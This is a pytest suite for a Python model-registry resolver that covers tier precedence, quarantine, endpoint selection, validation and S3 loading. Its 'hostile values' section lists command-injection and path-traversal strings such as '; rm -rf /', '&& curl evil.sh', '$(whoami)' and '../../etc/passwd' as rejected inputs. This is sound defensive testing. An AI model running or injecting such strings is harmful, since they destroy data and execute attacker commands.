"""One model registry — the Python twin's resolution contract (TEAM-4995).

Two kinds of test here, deliberately:

  1. FIXTURE cases, parametrized from src/config/__fixtures__/models-registry.case.json
     — the shared table that pins the JS resolver and this one to the SAME answers.
     That file is authored by TEAM-4997 and may not be on this branch yet; when it
     is absent that ONE test skips and everything below still runs. The fixture is
     never forked or copied here — a second copy would be a second source of truth,
     which is the whole bug this ticket removes.

  2. Fixture-INDEPENDENT unit tests over small inline registries. These carry the
     real coverage: precedence order, the quarantine kill switch, retirement
     falling THROUGH rather than resolving, endpoint selection per CLI, and the
     two places a hostile value would escape (MODEL_ID_RE, `--export` quoting).

The module is imported directly (unlike main.py, which cannot be imported — it
installs Node.js and reads S3 at module scope). load_registry() is the only
function that touches boto3 and is exercised with a stubbed client.
"""

import importlib.util
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

RUNTIME_DIR = Path(__file__).resolve().parent.parent
REPO_ROOT = RUNTIME_DIR.parent.parent
MODULE_PATH = RUNTIME_DIR / "models_registry.py"
FIXTURE = REPO_ROOT / "src" / "config" / "__fixtures__" / "models-registry.case.json"


def _load_module():
    spec = importlib.util.spec_from_file_location("models_registry_under_test", MODULE_PATH)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


mr = _load_module()


@pytest.fixture(autouse=True)
def _clean_env(monkeypatch):
    """Every resolution tail reads env vars, so no test may inherit the runner's."""
    for var in ("MODEL_ID", "ANTHROPIC_MODEL", "CLAUDE_MODEL", "CODEX_MODEL",
                "BEDROCK_MANTLE_REGION", "AWS_REGION",
                "ARTIFACT_BUCKET", "AGENTCORE_HUB_ARTIFACT_BUCKET"):
        monkeypatch.delenv(var, raising=False)
    mr.reset_cache()


# ─── a registry small enough to read, big enough to be interesting ──────────

def _registry():
    return {
        "version": 3,
        "models": [
            {"modelId": "us.anthropic.claude-fable-5-1", "aliases": ["fable-5"],
             "endpoint": "bedrock-runtime", "region": "us-east-1", "api": "converse",
             "contextWindow": 500000},
            {"modelId": "us.anthropic.claude-opus-5", "status": "active"},
            {"modelId": "us.anthropic.claude-sonnet-5", "status": "candidate"},
            {"modelId": "us.anthropic.claude-opus-4-1", "status": "retired"},
            {"modelId": "us.openai.gpt-6-sol", "endpoint": "bedrock-runtime",
             "region": "us-east-1", "api": "responses", "contextWindow": 300000},
            {"modelId": "openai.gpt-5.5", "endpoint": "bedrock-mantle",
             "region": "us-east-2", "api": "responses"},
        ],
        "tiers": {
            "claude": {"fable": "us.anthropic.claude-fable-5-1",
                       "opus": "us.anthropic.claude-opus-5",
                       "sonnet": "us.anthropic.claude-sonnet-5"},
            "codex": {"sol": "us.openai.gpt-6-sol"},
        },
        "legacyAliases": {"claude-sonnet-45": "us.anthropic.claude-sonnet-5"},
        "agents": {"agentcore_hub_backend_dev": "us.anthropic.claude-opus-5"},
        "defaults": {"persona": "us.anthropic.claude-fable-5-1",
                     "codingClaude": "us.anthropic.claude-fable-5-1",
                     "codingCodex": "openai.gpt-5.5"},
    }


def _validated(doc=None):
    out, warnings, errors = mr.validate_registry(doc or _registry())
    assert errors == [], errors
    return out


# ─── 1. the shared fixture (skipped until TEAM-4997 lands it) ───────────────

def _fixture_cases():
    if not FIXTURE.exists():
        return []
    doc = json.loads(FIXTURE.read_text())
    return doc.get("cases") or doc.get("resolveCases") or []


@pytest.mark.parametrize("case", _fixture_cases() or [None],
                         ids=lambda c: (c or {}).get("name", "fixture-absent") if c else "fixture-absent")
def test_shared_fixture_cases(case):
    """The Python twin must give the same answer as the JS resolver, case for case."""
    if case is None:
        pytest.skip("fixture authored by TEAM-4997 not on branch yet")
    registry = _validated(case["registry"]) if case.get("registry") else None
    if case.get("env"):
        for k, v in case["env"].items():
            os.environ[k] = v
    kind = case.get("kind", "model")
    if kind == "agent":
        got = mr.resolve_agent_model(registry, case.get("agentId", ""), case.get("override"))
    elif kind == "coding":
        got = mr.resolve_coding_model(registry, case.get("input", ""), case.get("cli", "claude"))[0]
    else:
        got = mr.resolve_model(registry, case.get("input", ""), case.get("cli"))
    assert got == case["expected"], case.get("name")


# ─── 2. resolve_model precedence ────────────────────────────────────────────

def test_tier_resolves_per_cli():
    reg = _validated()
    assert mr.resolve_model(reg, "opus", "claude") == "us.anthropic.claude-opus-5"
    assert mr.resolve_model(reg, "sol", "codex") == "us.openai.gpt-6-sol"


def test_a_tier_is_scoped_to_its_cli():
    # "sol" is a Codex tier; asking as claude must NOT cross the wires.
    reg = _validated()
    assert mr.resolve_model(reg, "sol", "claude") is None
    assert mr.resolve_model(reg, "opus", "codex") is None


def test_quarantine_beats_a_tier_and_an_explicit_id():
    doc = _registry()
    doc["quarantine"] = ["us.anthropic.claude-opus-5", "opus"]
    reg = _validated(doc)
    assert mr.resolve_model(reg, "opus", "claude") is None
    assert mr.resolve_model(reg, "us.anthropic.claude-opus-5") is None


def test_legacy_alias_still_resolves():
    assert mr.resolve_model(_validated(), "claude-sonnet-45") == "us.anthropic.claude-sonnet-5"


def test_row_alias_resolves_and_candidate_status_is_usable():
    reg = _validated()
    assert mr.resolve_model(reg, "fable-5") == "us.anthropic.claude-fable-5-1"
    assert mr.resolve_model(reg, "us.anthropic.claude-sonnet-5") == "us.anthropic.claude-sonnet-5"


def test_retired_row_does_not_resolve():
    # It falls THROUGH (None) so the caller drops to its next precedence step —
    # resolving a withdrawn model anyway is the bug this replaces.
    assert mr.resolve_model(_validated(), "us.anthropic.claude-opus-4-1") is None


def test_unknown_id_with_a_dot_passes_through():
    # A model published after the last reconcile must still be usable.
    assert mr.resolve_model(_validated(), "us.anthropic.claude-nova-9") == "us.anthropic.claude-nova-9"


def test_unknown_bare_word_does_not_pass_through():
    assert mr.resolve_model(_validated(), "bigmodel") is None
    assert mr.resolve_model(_validated(), "") is None
    assert mr.resolve_model(_validated(), None) is None


def test_a_none_registry_behaves_as_empty():
    # No tiers, no aliases, no catalog — but passthrough and the literal tails work.
    assert mr.resolve_model(None, "opus", "claude") is None
    assert mr.resolve_model(None, "us.anthropic.claude-opus-5") == "us.anthropic.claude-opus-5"


# ─── 3. resolve_agent_model precedence ──────────────────────────────────────

def test_agent_override_wins():
    reg = _validated()
    assert mr.resolve_agent_model(reg, "agentcore_hub_backend_dev", "sonnet") == \
        "us.anthropic.claude-sonnet-5"


def test_agent_pin_beats_the_default():
    reg = _validated()
    assert mr.resolve_agent_model(reg, "agentcore_hub_backend_dev") == "us.anthropic.claude-opus-5"
    assert mr.resolve_agent_model(reg, "agentcore_hub_qa_verifier") == "us.anthropic.claude-fable-5-1"


def test_an_unresolvable_override_falls_through_to_the_pin():
    reg = _validated()
    assert mr.resolve_agent_model(reg, "agentcore_hub_backend_dev", "nonsense") == \
        "us.anthropic.claude-opus-5"


def test_env_fallback_when_there_is_no_registry(monkeypatch):
    monkeypatch.setenv("MODEL_ID", "us.anthropic.claude-haiku-4-5")
    assert mr.resolve_agent_model(None, "whoever") == "us.anthropic.claude-haiku-4-5"


def test_quarantine_beats_the_env_var(monkeypatch):
    doc = _registry()
    doc["quarantine"] = ["us.anthropic.claude-opus-5"]
    monkeypatch.setenv("MODEL_ID", "us.anthropic.claude-opus-5")
    doc["defaults"] = {}
    reg = _validated(doc)
    assert mr.resolve_agent_model(reg, "nobody") == mr.LITERAL_PERSONA


def test_literal_fallback_is_the_last_resort():
    assert mr.resolve_agent_model(None, "whoever") == mr.LITERAL_PERSONA
    assert mr.LITERAL_PERSONA == "us.anthropic.claude-fable-5-1"


# ─── 4. resolve_coding_model, per endpoint ──────────────────────────────────

def test_coding_claude_tier_carries_bedrock_runtime_converse():
    model, endpoint, region, api, ctx = mr.resolve_coding_model(_validated(), "fable", "claude")
    assert (model, endpoint, region, api, ctx) == (
        "us.anthropic.claude-fable-5-1", "bedrock-runtime", "us-east-1", "converse", 500000)


def test_coding_codex_tier_on_bedrock_runtime_keeps_its_own_region():
    model, endpoint, region, api, ctx = mr.resolve_coding_model(_validated(), "sol", "codex")
    assert (model, endpoint, region, api, ctx) == (
        "us.openai.gpt-6-sol", "bedrock-runtime", "us-east-1", "responses", 300000)


def test_coding_codex_default_lands_on_mantle():
    model, endpoint, region, api, _ = mr.resolve_coding_model(_validated(), "", "codex")
    assert (model, endpoint, region, api) == ("openai.gpt-5.5", "bedrock-mantle", "us-east-2", "responses")


def test_coding_env_fallback_per_cli(monkeypatch):
    monkeypatch.setenv("ANTHROPIC_MODEL", "us.anthropic.claude-opus-5")
    monkeypatch.setenv("CODEX_MODEL", "openai.gpt-5.4")
    assert mr.resolve_coding_model(None, "", "claude")[0] == "us.anthropic.claude-opus-5"
    assert mr.resolve_coding_model(None, "", "codex")[0] == "openai.gpt-5.4"


def test_claude_model_is_the_second_claude_env_name(monkeypatch):
    monkeypatch.setenv("CLAUDE_MODEL", "us.anthropic.claude-sonnet-5")
    assert mr.resolve_coding_model(None, "", "claude")[0] == "us.anthropic.claude-sonnet-5"


def test_coding_literal_fallback_endpoints():
    assert mr.resolve_coding_model(None, "", "claude") == (
        mr.LITERAL_CODING_CLAUDE, "bedrock-runtime", "us-east-1", "converse", 400000)
    assert mr.resolve_coding_model(None, "", "codex") == (
        mr.LITERAL_CODING_CODEX, "bedrock-mantle", "us-east-2", "responses", 400000)


def test_a_tier_name_without_a_registry_falls_back_to_the_default():
    # There is no literal tier map any more: with no registry, "opus" cannot be
    # resolved and the caller gets the documented default rather than a guess.
    assert mr.resolve_coding_model(None, "opus", "claude")[0] == mr.LITERAL_CODING_CLAUDE


def test_mantle_region_env_is_only_read_for_mantle(monkeypatch):
    monkeypatch.setenv("BEDROCK_MANTLE_REGION", "eu-west-1")
    monkeypatch.setenv("AWS_REGION", "us-west-2")
    assert mr.resolve_coding_model(None, "", "codex")[2] == "eu-west-1"
    assert mr.resolve_coding_model(None, "", "claude")[2] == "us-west-2"


def test_base_url_per_endpoint():
    assert mr.base_url_for("bedrock-runtime", "us-east-1") == \
        "https://bedrock-runtime.us-east-1.amazonaws.com/openai/v1"
    assert mr.base_url_for("bedrock-mantle", "us-east-2") == \
        "https://bedrock-mantle.us-east-2.api.aws/openai/v1"


# ─── 5. hostile values ──────────────────────────────────────────────────────

@pytest.mark.parametrize("bad", [
    "; rm -rf /",
    "us.anthropic.claude-5 && curl evil.sh",
    "$(whoami)",
    "../../etc/passwd",
    "a" * 200,
    "-leading-dash",
])
def test_model_id_re_rejects(bad):
    assert not mr.MODEL_ID_RE.match(bad)


def test_a_hostile_row_is_dropped_not_resolved():
    doc = _registry()
    doc["models"].append({"modelId": "evil; rm -rf /"})
    reg = _validated(doc)
    assert mr.resolve_model(reg, "evil; rm -rf /") is None
    assert all(m["modelId"] != "evil; rm -rf /" for m in reg["models"])


def test_a_row_with_a_hostile_region_is_dropped():
    # The region is interpolated into a base URL and a shell eval, so a value
    # that is not REGION_RE makes the ROW unusable rather than being sanitized.
    doc = _registry()
    doc["models"].append({"modelId": "us.openai.gpt-6-luna", "region": "us-east-1; rm -rf /"})
    reg = _validated(doc)
    assert all(m["modelId"] != "us.openai.gpt-6-luna" for m in reg["models"])
    # The id still passes through (it looks like a model id), but with no row
    # there is no hostile region to carry: the endpoint default applies.
    assert mr.resolve_coding_model(reg, "us.openai.gpt-6-luna", "codex")[2] == "us-east-2"


def test_a_hostile_region_on_a_REFERENCED_row_invalidates_the_document():
    # Dropping the row the defaults point at would silently change which model
    # runs, so the whole document is refused and the caller falls back loudly.
    doc = _registry()
    doc["models"][0]["region"] = "us-east-1; rm -rf /"
    out, warnings, errors = mr.validate_registry(doc)
    assert out is None
    assert any("defaults.persona" in e for e in errors)


@pytest.mark.parametrize("hostile", ["sol; rm -rf /", "$(id)", "a b c"])
def test_export_never_emits_an_unquoted_hostile_value(hostile):
    out = subprocess.run(
        [sys.executable, str(MODULE_PATH), "--export", "codex", hostile],
        capture_output=True, text=True,
        env={k: v for k, v in os.environ.items()
             if k not in ("ARTIFACT_BUCKET", "AGENTCORE_HUB_ARTIFACT_BUCKET")},
    )
    assert out.returncode == 0, out.stderr
    assert hostile not in out.stdout  # never reaches the eval at all
    assert "CODEX_RESOLVED_MODEL=openai.gpt-5.5" in out.stdout


def test_export_prints_both_sets_and_exits_zero():
    out = subprocess.run(
        [sys.executable, str(MODULE_PATH), "--export", "claude", "codex"],
        capture_output=True, text=True,
        env={k: v for k, v in os.environ.items()
             if k not in ("ARTIFACT_BUCKET", "AGENTCORE_HUB_ARTIFACT_BUCKET")},
    )
    assert out.returncode == 0
    for var in ("CLAUDE_RESOLVED_MODEL", "CLAUDE_ENDPOINT", "CLAUDE_REGION", "CLAUDE_API",
                "CODEX_RESOLVED_MODEL", "CODEX_ENDPOINT", "CODEX_REGION", "CODEX_API",
                "CODEX_BASE_URL", "CODEX_CONTEXT_WINDOW"):
        assert f"export {var}=" in out.stdout, var
    # BEDROCK_MANTLE_REGION is mantle-only and must never be exported by us —
    # exporting it would hand a Mantle region to a bedrock-runtime model.
    assert "BEDROCK_MANTLE_REGION=" not in out.stdout


def test_export_with_no_cli_is_a_usage_error():
    out = subprocess.run([sys.executable, str(MODULE_PATH), "--export", "sol"],
                         capture_output=True, text=True)
    assert out.returncode == 2


# ─── 6. validate_registry ───────────────────────────────────────────────────

def test_a_malformed_row_is_dropped_with_a_warning():
    doc = _registry()
    doc["models"].append({"nope": 1})
    out, warnings, errors = mr.validate_registry(doc)
    assert errors == []
    assert any("dropped" in w for w in warnings)


def test_a_dangling_default_invalidates_the_whole_document():
    doc = _registry()
    doc["defaults"]["persona"] = "us.anthropic.claude-does-not-exist"
    out, warnings, errors = mr.validate_registry(doc)
    assert out is None and errors


def test_a_dangling_tier_invalidates_the_whole_document():
    doc = _registry()
    doc["tiers"]["claude"]["opus"] = "gone"
    out, _, errors = mr.validate_registry(doc)
    assert out is None and errors


def test_a_dropped_row_referenced_by_a_tier_invalidates_the_document():
    doc = _registry()
    doc["models"] = [m for m in doc["models"] if m["modelId"] != "us.anthropic.claude-opus-5"]
    doc["models"].append({"modelId": "us.anthropic.claude-opus-5", "status": "banana"})
    out, warnings, errors = mr.validate_registry(doc)
    assert out is None
    assert any("dropped" in w for w in warnings)
    assert any("tiers.claude.opus" in e for e in errors)


def test_a_duplicate_model_id_is_dropped():
    doc = _registry()
    doc["models"].append({"modelId": "us.anthropic.claude-opus-5", "aliases": ["dup"]})
    out, warnings, _ = mr.validate_registry(doc)
    assert any("duplicate" in w for w in warnings)
    assert mr.resolve_model(out, "dup") is None


def test_an_ambiguous_alias_is_dropped_but_the_row_survives():
    doc = _registry()
    doc["models"][1]["aliases"] = ["fable-5"]  # already owned by the fable row
    out, warnings, _ = mr.validate_registry(doc)
    assert any("ambiguous" in w for w in warnings)
    assert mr.resolve_model(out, "fable-5") == "us.anthropic.claude-fable-5-1"
    assert mr.resolve_model(out, "us.anthropic.claude-opus-5") == "us.anthropic.claude-opus-5"


def test_a_dated_duplicate_folds_into_its_base_id():
    doc = _registry()
    doc["models"].append({"modelId": "us.anthropic.claude-opus-5-20251001-v1:0"})
    out, warnings, _ = mr.validate_registry(doc)
    assert any("dated duplicate" in w for w in warnings)
    assert mr.resolve_model(out, "us.anthropic.claude-opus-5-20251001-v1:0") == \
        "us.anthropic.claude-opus-5"


def test_a_not_an_object_document_is_an_error():
    assert mr.validate_registry([1, 2, 3])[0] is None
    assert mr.validate_registry({"models": "nope"})[0] is None


def test_agents_keys_are_checked_against_the_real_roster():
    roster = REPO_ROOT / "src" / "config" / "agents.json"
    doc = _registry()
    doc["agents"] = {"not_a_real_agent": "us.anthropic.claude-opus-5"}
    out, _, errors = mr.validate_registry(doc, agents_path=str(roster))
    assert out is None
    assert any("not_a_real_agent" in e for e in errors)


def test_the_telegram_bridge_is_an_exempt_agent_id():
    roster = REPO_ROOT / "src" / "config" / "agents.json"
    doc = _registry()
    doc["agents"] = {"telegram_intake": "us.anthropic.claude-opus-5"}
    out, _, errors = mr.validate_registry(doc, agents_path=str(roster))
    assert errors == [] and out is not None


def test_the_roster_check_is_skipped_when_agents_json_is_unreadable():
    # agents.json is NOT shipped into either Python container, so absence is the
    # normal case at runtime and must not invalidate a good registry.
    doc = _registry()
    doc["agents"] = {"whatever_agent": "us.anthropic.claude-opus-5"}
    out, _, errors = mr.validate_registry(doc, agents_path="/nonexistent/agents.json")
    assert errors == [] and out is not None


# ─── 7. load_registry ───────────────────────────────────────────────────────

def test_load_registry_without_a_bucket_returns_none(caplog):
    with caplog.at_level("INFO"):
        assert mr.load_registry() is None
    assert "registry.fallback reason=no-bucket" in caplog.text


def _stub_s3(monkeypatch, body, etag="abc123", calls=None):
    class _Body:
        def read(self):
            return body

    class _Client:
        def get_object(self, Bucket, Key):
            if calls is not None:
                calls.append((Bucket, Key))
            return {"Body": _Body(), "ETag": f'"{etag}"'}

    monkeypatch.setenv("ARTIFACT_BUCKET", "bkt")
    monkeypatch.setitem(sys.modules, "boto3", type("m", (), {"client": staticmethod(lambda *a, **k: _Client())}))


def test_load_registry_reads_s3_and_logs_the_load(monkeypatch, caplog):
    calls = []
    _stub_s3(monkeypatch, json.dumps(_registry()).encode(), calls=calls)
    with caplog.at_level("INFO"):
        reg = mr.load_registry()
    assert reg is not None
    assert calls == [("bkt", "config/models.json")]
    assert "registry.loaded source=s3 version=3 rows=6 etag=abc123" in caplog.text


def test_load_registry_does_one_get_per_call_by_default(monkeypatch):
    # The hot-reload contract: a tier repointed by the reconcile must be visible
    # on the NEXT turn of a warm container, with no redeploy.
    calls = []
    _stub_s3(monkeypatch, json.dumps(_registry()).encode(), calls=calls)
    mr.load_registry()
    mr.load_registry()
    assert len(calls) == 2


def test_load_registry_caches_only_when_asked(monkeypatch):
    calls = []
    _stub_s3(monkeypatch, json.dumps(_registry()).encode(), calls=calls)
    mr.load_registry(ttl_seconds=60)
    mr.load_registry(ttl_seconds=60)
    assert len(calls) == 1


def test_load_registry_on_bad_json(monkeypatch, caplog):
    _stub_s3(monkeypatch, b"{not json")
    with caplog.at_level("WARNING"):
        assert mr.load_registry() is None
    assert "registry.fallback reason=parse" in caplog.text


def test_load_registry_on_an_invalid_document(monkeypatch, caplog):
    doc = _registry()
    doc["defaults"]["persona"] = "gone"
    _stub_s3(monkeypatch, json.dumps(doc).encode())
    with caplog.at_level("WARNING"):
        assert mr.load_registry() is None
    assert "registry.fallback reason=invalid" in caplog.text


def test_load_registry_swallows_an_s3_error(monkeypatch, caplog):
    class _Client:
        def get_object(self, **kwargs):
            raise RuntimeError("AccessDenied")

    monkeypatch.setenv("AGENTCORE_HUB_ARTIFACT_BUCKET", "bkt")
    monkeypatch.setitem(sys.modules, "boto3",
                        type("m", (), {"client": staticmethod(lambda *a, **k: _Client())}))
    with caplog.at_level("WARNING"):
        assert mr.load_registry() is None
    assert "registry.fallback reason=s3" in caplog.text


def test_the_hub_specific_bucket_var_wins(monkeypatch):
    # AgentCore reserves ARTIFACT_BUCKET on the fleet runtime, so the hub name
    # must be preferred wherever both are set.
    calls = []
    _stub_s3(monkeypatch, json.dumps(_registry()).encode(), calls=calls)
    monkeypatch.setenv("AGENTCORE_HUB_ARTIFACT_BUCKET", "hub-bkt")
    mr.load_registry()
    assert calls[0][0] == "hub-bkt"
